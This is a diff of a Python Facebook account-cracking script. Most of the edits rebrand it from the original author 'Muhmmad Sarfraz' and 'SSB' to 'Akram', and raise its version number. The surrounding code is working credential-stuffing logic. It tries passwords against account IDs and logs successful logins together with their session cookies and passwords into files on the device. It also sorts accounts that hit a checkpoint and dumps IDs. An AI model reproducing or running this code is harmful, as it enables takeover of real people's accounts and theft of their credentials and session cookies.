@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Muhmmad Sarfraz
+#Original written By Akram
 
 import os,zlib
 
@@ -88,7 +88,7 @@ logo =                                          """
 \033[1;37m Owner   :            AKRAM
 \033[1;37m Facebook:            AkraM 3:)
 \033[1;37m Github  :            akram765
-\033[1;37m Version :            1.0
+\033[1;37m Version :            2.0
 \033[1;37m------------------------------------------------ """
 def clear():
     os.system("clear")
@@ -155,7 +155,7 @@ def method_crack():
     print(f'[1] Method {1}')
     print(f'[2] Method {2}')
     print(f'[3] Method {3}')
-    print(f'[4] Method {4}')
+    # print(f'[4] Method {4}')
     print(f'[0] Back')
     print('')
     option = input('Select method>: ')
@@ -317,10 +317,10 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [AKRAM-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/AKRAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/AKRAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AKRAM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [AKRAM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AKRAM_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -383,12 +383,12 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [AKRAM-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/AKRAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/AKRAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AKRAM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     #  print(f"\r{A} [AKRAM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/AKRAM_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -417,7 +417,7 @@ class main_crack():
                 if 'c_user' in session.cookies.get_dict():
                     print(f"\r{R} [AKRAM-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/AKRAM_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
                     #print(f"\r{A} [AKRAM-CP] {sid} | {ps} {S}")
@@ -663,7 +663,7 @@ def cutter():
     print(47*'-')
     print("File Saved To :" + sarfraz )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back akramking Menu ")
     menu
        
 
@@ -825,7 +825,7 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back akramking Menu ")
         SSB(allkey)
     except Exception as e:
         print("Error : %s"%e) 
@@ -843,7 +843,7 @@ def cutter():
     print("Removed Successful From File: " + ssb )
     print("New File Saved:" + sarfraz )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back akramking Menu ")
     SSB(allkey)       
     
 def removef():
